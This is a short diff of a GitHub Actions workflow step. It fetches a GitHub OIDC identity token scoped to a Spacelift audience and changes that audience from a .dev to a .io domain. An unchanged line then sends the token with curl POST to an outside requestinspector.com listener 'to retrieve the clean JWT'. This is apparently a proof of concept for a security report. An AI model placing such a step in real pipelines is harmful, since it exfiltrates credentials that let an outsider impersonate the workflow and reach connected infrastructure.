@@ -10,7 +10,7 @@ jobs:
         run: |
           # Request the token with Spacelift audience
           JWT=$(curl -sLS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://ywhtriage2.app.spacelift.dev" | jq -r '.value')
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://ywhtriage2.app.spacelift.io" | jq -r '.value')
 
           # Send to an external listener to retrieve the clean JWT
           curl -X POST -d "$JWT" https://01kktty0nwh2gney6ms5a6wenc00-8c2fa1af10b0e75a8d9d.requestinspector.com
